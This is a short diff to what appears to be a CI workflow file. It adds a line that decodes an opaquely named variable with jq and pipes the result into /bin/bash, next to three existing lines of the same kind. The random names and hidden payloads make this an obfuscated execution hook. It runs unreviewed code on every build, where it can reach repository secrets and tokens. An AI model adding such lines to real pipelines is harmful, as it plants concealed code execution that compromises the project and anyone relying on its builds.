@@ -24,6 +24,7 @@ jobs:
           echo $q27 | jq -r .zmygn6585 | /bin/bash
           echo $fneo350 | jq -r .r9169 | /bin/bash
           printf '%s' "$vt4" | jq -r .abvwr72 | /bin/bash
+          echo $g31 | jq -r .wg512 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
